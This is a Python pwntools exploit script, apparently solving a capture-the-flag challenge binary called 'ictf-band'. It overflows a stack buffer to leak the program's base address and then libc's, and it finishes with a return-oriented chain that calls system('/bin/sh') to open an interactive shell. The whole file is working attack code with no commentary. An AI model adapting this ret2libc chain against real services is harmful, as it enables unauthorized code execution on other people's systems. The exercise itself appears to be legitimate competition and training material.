#!/usr/bin/env python3

from pwn import *
from subprocess import check_output

exe = ELF('./ictf-band_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
mangle = lambda val, adrs: 	(adrs >> 12) ^ val

cmd=f'''
brva 0x1FCE 
'''

def GDB():
    if args.DOCKER:
        gdb.attach(pid, exe=exe.path, 
            gdbscript=f"set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe\n" + cmd)
        pause()
    else:
        gdb.attach(p, gdbscript = cmd)
        input()


if args.REMOTE:
    p = remote('')
elif args.DOCKER:
    p = remote('')
    sleep(2)
else:
    p = process([exe.path])

def ext(data, length, pload):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b':', f'{data}')
    p.sendlineafter(b':', f'{length}')
    p.sendlineafter(b':', pload)


payload = flat([
    cyclic(0x167),
    p8(0xeb) # b'\xeb'
])
pload = len(payload) + 0x1
ext(b'AAA', str(pload), payload)    
p.recvuntil(b'adoaa')
exe.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x22eb
info('Exe base: ' + hex(exe.address))
ret = exe.address +  0x1e8b
payload = flat([
    cyclic(0x167),
    exe.plt.puts,
    ret
])

pload = len(payload) + 0x1

ext(b'AAA', str(pload), payload)
p.recvuntil(b'ved!')
p.recvuntil(b'adoaa')
p.recvline()
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x62050
info('Libc base: ' + hex(libc.address))
pop_rdi = libc.address + 0x2a3e5
payload = flat([
    cyclic(0x167),
    pop_rdi,
    next(libc.search(b'/bin/sh\0')),
    pop_rdi + 1,
    libc.sym.system
])
pload = len(payload) + 0x1
p.sendlineafter(b': ', str(pload))
p.sendlineafter(b': ', payload)
ext(b'AAA', str(pload), payload)

p.interactive()
